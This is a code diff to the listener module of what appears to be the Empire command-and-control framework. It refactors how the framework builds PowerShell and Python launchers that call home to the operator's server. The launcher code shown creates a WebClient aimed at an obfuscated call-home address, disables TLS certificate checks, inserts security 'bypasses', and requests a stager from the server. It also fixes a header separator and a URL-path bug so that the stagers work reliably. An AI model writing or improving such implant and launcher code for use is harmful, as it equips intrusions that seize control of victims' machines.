@@ -31,6 +31,11 @@ from empire.server.utils import cert_util, data_util, listener_util, log_util
 LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
 
+# Separates header entries patched into the PowerShell stager's $customHeaders;
+# http_malleable.ps1.j2 splits on the same literal. A comma would tear apart a
+# User-Agent such as "(KHTML, like Gecko)".
+STAGER_HEADER_SEPARATOR = "<HEND>"
+
 
 class Listener:
     def __init__(self, mainMenu: MainMenu):
@@ -197,15 +202,20 @@ class Listener:
         "http://None/..." download URL into the launcher template and
         fail silently on target.
         """
-        if self.host_address is None:
-            raise RuntimeError(
-                f"stager_url() called before host_address is set on listener "
-                f"{self.options['Name']['Value']!r}; listener may not be started"
-            )
+        host_address = self._require_host_address("stager_url")
         profile = malleable.Profile._deserialize(self.serialized_profile)
         uris = profile.stager.client.uris or ["/"]
         uri = secrets.choice(uris)
-        return f"{self.host_address}{uri.lstrip('/')}"
+        return f"{host_address}{uri.lstrip('/')}"
+
+    def _require_host_address(self, caller: str) -> str:
+        """host_address, or a clear error when the listener has not started."""
+        if self.host_address is None:
+            raise RuntimeError(
+                f"{caller}() called before host_address is set on listener "
+                f"{self.options['Name']['Value']!r}; listener may not be started"
+            )
+        return self.host_address
 
     def generate_launcher(
         self,
@@ -232,15 +242,12 @@ class Listener:
         # extract the set options for this instantiated listener
         listenerOptions = active_listener.options
 
-        port = listenerOptions["Port"]["Value"]
-        host = listenerOptions["Host"]["Value"]
         launcher = listenerOptions["Launcher"]["Value"]
         stagingKey = listenerOptions["StagingKey"]["Value"]
+        host_address = self._require_host_address("generate_launcher")
 
         # build profile
         profile = malleable.Profile._deserialize(self.serialized_profile)
-        profile.stager.client.host = host
-        profile.stager.client.port = port
         profile.stager.client.path = profile.stager.client.random_uri()
 
         if user_agent and user_agent.lower() != "default":
@@ -283,17 +290,14 @@ class Listener:
             launcherBase += "$wc=New-Object System.Net.WebClient;"
             launcherBase += (
                 "$ser="
-                + helpers.obfuscate_call_home_address(
-                    profile.stager.client.scheme + "://" + profile.stager.client.netloc
-                )
+                + helpers.obfuscate_call_home_address(host_address.rstrip("/"))
                 + ";$t='"
-                + profile.stager.client.path
-                + profile.stager.client.query
+                + profile.stager.client.request_target
                 + "';"
             )
 
             # ==== HANDLE SSL ====
-            if profile.stager.client.scheme == "https":
+            if host_address.startswith("https"):
                 # allow for self-signed certificates for https connections
                 launcherBase += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -391,14 +395,14 @@ class Listener:
             launcherBase += "import urllib.request,urllib.parse\n"
 
             # ==== HANDLE SSL ====
-            if profile.stager.client.scheme == "https":
+            if host_address.startswith("https"):
                 launcherBase += "import ssl\n"
                 launcherBase += "if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context\n"
 
             for bypass in bypasses:
                 launcherBase += bypass
 
-            launcherBase += f"server='{self.host_address}'\n"
+            launcherBase += f"server='{host_address}'\n"
 
             # ==== CONFIGURE PROXY ====
             if proxy and proxy.lower() != "none":
@@ -455,7 +459,12 @@ class Listener:
 
             # ==== BUILD REQUEST ====
             launcherBase += "vreq=type('vreq',(urllib.request.Request,object),{'get_method':lambda self:self.verb if (hasattr(self,'verb') and self.verb) else urllib.request.Request.get_method(self)})\n"
-            launcherBase += f"req=vreq('{profile.stager.client.url}', {profile.stager.client.body})\n"
+            # server ends in "/"; a leading slash here would request "//init/",
+            # which Werkzeug answers with a 308 that older urllib does not follow.
+            target = profile.stager.client.request_target.lstrip("/")
+            launcherBase += (
+                f"req=vreq(server+'{target}', {profile.stager.client.body})\n"
+            )
             launcherBase += "req.verb='" + profile.stager.client.verb + "'\n"
 
             # ==== ADD HEADERS ====
@@ -657,7 +666,7 @@ class Listener:
 
             # patch in custom headers
             if profile.stager.client.headers:
-                headers = ",".join(
+                headers = STAGER_HEADER_SEPARATOR.join(
                     [
                         ":".join([k.replace(":", "%3A"), v.replace(":", "%3A")])
                         for k, v in profile.stager.client.headers.items()
